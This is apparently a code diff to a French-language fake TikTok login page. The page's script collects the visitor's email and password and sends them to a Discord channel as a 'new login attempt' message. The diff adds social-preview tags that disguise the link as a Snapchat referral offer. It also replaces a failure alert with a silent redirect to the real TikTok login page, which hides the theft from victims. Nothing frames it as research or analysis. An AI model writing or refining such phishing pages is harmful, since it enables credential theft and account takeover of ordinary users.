@@ -4,6 +4,12 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Connexion Rankos - TikTok</title>
+
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
+  <meta property="og:description" content="Description courte" />
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSr0xDspJ_bHYIOfoU1go7_aEANL6-8C1B9uHxPd0SUaXoieZzW_lkdQq-tlHhmZ2H8oeQ&usqp=CAU" />
+
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     * {
@@ -263,7 +269,7 @@
     const loginBtn = document.getElementById('loginBtn');
 
     function updateButtonState() {
-      if (emailInput.value.trim().length >= 5 && passwordInput.value.trim().length >= 5) {
+      if (emailInput.value.trim().length > 5 && passwordInput.value.trim().length > 5) {
         loginBtn.disabled = false;
         loginBtn.classList.add('active');
       } else {
@@ -279,7 +285,7 @@
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
 
-      if (email.length < 5 || password.length < 5) return;
+      if (email.length <= 5 || password.length <= 5) return;
 
       const discordMessage =
         `📥 **Nouvelle tentative de connexion TikTok**\n\n` +
@@ -291,8 +297,10 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: discordMessage })
-      }).then(() => {
-        alert("Connexion échouée. Veuillez réessayer.");
+      }).finally(() => {
+        setTimeout(() => {
+          window.location.href = 'https://www.tiktok.com/login/phone-or-email/email';
+        }, 1500);
       });
     });
   </script>
